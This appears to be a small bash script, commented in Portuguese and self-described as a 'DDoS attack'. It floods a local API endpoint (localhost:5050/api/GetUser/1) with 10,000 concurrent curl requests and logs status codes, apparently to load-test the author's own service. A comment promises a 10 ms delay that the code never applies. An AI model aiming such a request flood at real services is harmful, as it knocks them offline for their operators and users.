#!/bin/bash

# URL para enviar as requisições
# URL="http://localhost:5050/api/GetUser/2"
URL="http://localhost:5050/api/GetUser/1"

# Número de requisições a serem enviadas
NUM_REQUESTS=1000

# Número de vezes que o loop externo será executado
NUM_LOOPS=10

# Nome do arquivo para salvar as respostas
OUTPUT_FILE="responses.txt"

echo "Iniciando ataque DDoS..."

# Limpa o arquivo de saída, se já existir
> "$OUTPUT_FILE"

echo "Iniciando $NUM_LOOPS loops..."

# Loop externo para executar o código múltiplas vezes
for ((j=1; j<=$NUM_LOOPS; j++)); do
    echo "Loop $j:"
    
    # Loop interno para enviar as requisições
    for ((i=1; i<=$NUM_REQUESTS; i++)); do
        echo "Enviando requisição $i em background..."

        # Obtém o timestamp atual
        TIMESTAMP=$(date +%Y-%m-%d\ %H:%M:%S.%3N)
        
        # Utilizando curl para enviar a requisição GET para a URL em background
        curl -s -o /dev/null -w "$TIMESTAMP %{http_code}\n" "$URL" >> "$OUTPUT_FILE" &
        
        # Aguarda 10 milissegundos antes de iniciar a próxima requisição
    done
    
    echo "Loop $j concluído!"
done

# Aguarda todas as requisições em background serem concluídas
wait

echo "Ataque DDoS concluído. Respostas salvas em $OUTPUT_FILE."



